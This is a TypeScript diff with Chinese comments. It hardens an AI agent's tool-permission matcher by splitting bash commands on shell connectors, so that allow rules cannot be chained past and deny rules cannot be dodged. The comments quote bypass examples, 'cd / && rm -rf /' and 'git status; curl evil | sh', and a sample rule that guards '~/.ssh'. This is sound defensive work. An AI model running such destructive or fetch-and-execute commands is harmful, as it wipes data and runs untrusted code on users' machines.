@@ -7,8 +7,8 @@ import { absolutize, expandHome, isAbsoluteLike, normalizeSlashes } from '../uti
  *
  * 设计意图:用户用一眼可读的文本表达规则——`bash(rm *)`、`read(~/.ssh/**)`、
  * `mcp(context7)`、`web_fetch(domain:*.internal.example)`。
- * 匹配语义按工具类型区分:命令按 shell 通配、路径按文件通配(支持对文件名兜底)、
- * 域名不区分大小写。
+ * 匹配语义按工具类型区分:命令先按 shell 连接符分段再逐段通配(deny/ask 任一段命中
+ * 即命中,allow 需每段命中)、路径按文件通配(支持对文件名兜底)、域名不区分大小写。
  */
 
 /** 一次工具调用提取出的可匹配特征。 */
@@ -24,8 +24,15 @@ export interface ParsedRule {
   raw: string;
   tool: string;
   pattern: string;
-  match(target: RuleTarget): boolean;
+  /**
+   * mode 决定命令类规则的分段匹配方向:deny/ask 取「任一段命中」,
+   * allow 取「所有段命中」。省略时按 deny 处理(从严)。
+   */
+  match(target: RuleTarget, mode?: RuleMode): boolean;
 }
+
+/** 规则所属的类别,用于确定命令分段匹配的方向。 */
+export type RuleMode = 'allow' | 'ask' | 'deny';
 
 /** 路径类工具集合。 */
 const PATH_TOOLS = new Set(['read', 'write', 'edit', 'glob', 'grep']);
@@ -58,7 +65,7 @@ export function parseRule(raw: string): ParsedRule {
     raw,
     tool,
     pattern,
-    match(target: RuleTarget): boolean {
+    match(target: RuleTarget, mode: RuleMode = 'deny'): boolean {
       if (target.tool !== tool) {
         return false;
       }
@@ -66,7 +73,7 @@ export function parseRule(raw: string): ParsedRule {
         return true;
       }
       if (tool === 'bash') {
-        return target.command !== undefined && shellGlobMatch(pattern, target.command);
+        return target.command !== undefined && bashRuleMatch(pattern, target.command, mode);
       }
       if (PATH_TOOLS.has(tool)) {
         return target.path !== undefined && pathRuleMatch(pattern, target.path);
@@ -84,6 +91,32 @@ export function parseRule(raw: string): ParsedRule {
       return candidate !== undefined && shellGlobMatch(pattern, candidate);
     },
   };
+}
+
+/**
+ * 命令规则的匹配:先按 shell 连接符把命令拆成若干段,再逐段做通配匹配。
+ *
+ * 为什么拆:整串匹配时 `*` 会跨过 `;`、`&&`、`|` 吃掉后半段,于是 deny `bash(rm *)`
+ * 拦不住 `cd / && rm -rf /`,allow `bash(git *)` 反而放行 `git status; curl evil | sh`。
+ * 方向按类别取严:deny/ask 只要任一段命中即命中;allow 必须每一段都命中才放行。
+ */
+function bashRuleMatch(pattern: string, command: string, mode: RuleMode): boolean {
+  const segments = splitShellCommand(command);
+  if (segments.length === 0) {
+    return false;
+  }
+  if (mode === 'allow') {
+    return segments.every((segment) => shellGlobMatch(pattern, segment));
+  }
+  return segments.some((segment) => shellGlobMatch(pattern, segment));
+}
+
+/** 按 shell 连接符切分命令;引号内的分隔符不细分(过度切分只会让判定更保守)。 */
+function splitShellCommand(command: string): string[] {
+  return command
+    .split(/[;&|\n]+/)
+    .map((segment) => segment.trim())
+    .filter((segment) => segment !== '');
 }
 
 /** 文件规则的路径匹配:支持 ~ 展开、绝对路径、相对后缀与文件名兜底。 */
